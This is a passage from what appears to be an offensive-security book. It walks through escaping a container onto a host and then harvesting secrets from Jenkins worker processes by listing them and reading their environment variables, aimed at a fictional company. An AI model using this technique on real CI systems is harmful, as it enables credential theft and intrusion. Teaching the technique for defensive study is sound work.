    \ > ls /hostOS\nbin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found\
    \  media  mnt\nopt  proc  root  run...\n```\n\nLet the fun begin!\nAs we saw in\
    \ Chapter 10, Jenkins can quickly aggregate a considerable amount of privileges\
    \ due to its scheduling capabilities. It’s the Lehman Brothers of the technological\
    \ world—a hungry entity in an unregulated realm, encouraged by reckless policymakers\
    \ and one trade away from collapsing the whole economy.\n\nIn this particular\
    \ occurrence, that metaphorical trade happens to be how Jenkins handles environment\
    \ variables. When a job is scheduled on a worker, it can be configured either\
    \ to pull the two or three secrets it needs to run properly or to load every possible\
    \ secret as environment variables. Let’s find out just how lazy Gretsh Politico’s\
    \ admins really are.\n\nWe single out every process launched by Jenkins jobs on\
    \ this machine:\n\n```\nshell> ps -ed -o user,pid,cmd | grep \"jenkins\"\njenkins\
    \   1012   /lib/systemd/systemd -user\njenkins   1013   sshd: jenkins@notty\n\
    Jenkins   1276   java -XX:MaxPermSize=256m -jar remoting.jar...\njenkins   30737\
    \  docker run --rm -i -p 9876:9876 -v /var/lib/... \n--snip--\n```\n\nWe copy\
    \ the PIDs of these processes into a file and iterate over each line to fetch\
    \ their environment variables, conveniently stored at the path /prod/$PID/environ:\n\
    \n```\nshell> ps -ed -o user,pid,cmd \\\n| grep \"jenkins\" \\\n| awk '{print\
